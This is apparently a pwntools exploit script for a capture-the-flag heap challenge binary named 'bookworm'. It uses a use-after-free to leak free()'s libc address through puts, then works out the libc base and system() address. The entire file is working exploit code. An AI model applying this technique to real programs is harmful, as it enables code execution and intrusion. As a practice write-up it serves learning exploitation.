from pwn import *

app = gdb.debug('./target/bookworm', 'break *0x00400e24\ncontinue', env={"LD_PRELOAD" : "./target/libc.so.6"})

app.sendafter('>> ', '1\n')
app.sendafter('Enter book name size: ', '8\n')
app.sendafter('Enter book name: ', 'BBBBBBBB\n')
app.sendafter('Enter book summary size: ', '8\n')
app.sendafter('Enter book summary: ', 'CCCCCCCC\n')

app.sendafter('>> ', '2\n')
app.sendafter('Select Book ID (0-10): ', '0\n')

func = 0x00400700		# plt stub for puts()
arg = 0x00602018		# got entry for free()

app.sendafter('>> ', '1\n')
app.sendafter('Enter book name size: ', '23\n')
app.sendafter('Enter book name: ', p64(func) + p64(0x4545454545454545) + p64(arg)[:-1])
app.sendafter('Enter book summary size: ', '8\n')
app.sendafter('Enter book summary: ', 'DDDDDDDD\n')

app.sendafter('>> ', '4\n')
app.sendafter('Select Book ID (0-10): ', '0\n')

libcFree = app.readuntil(b'\n')[:-1]
libcFree = u64(libcFree + b'\x00' * (8 - len(libcFree)))

print('the address of free() in libc is ' + hex(libcFree))

elfLibc = ELF('./target/libc.so.6')
offsetFree = elfLibc.symbols['free']
offsetSystem = elfLibc.symbols['system']

libcBase = libcFree - offsetFree
print('the libc base address is ' + hex(libcBase))

libcSystem = libcBase + offsetSystem
print('the address of system() in libc is ' + hex(libcSystem))

app.interactive()

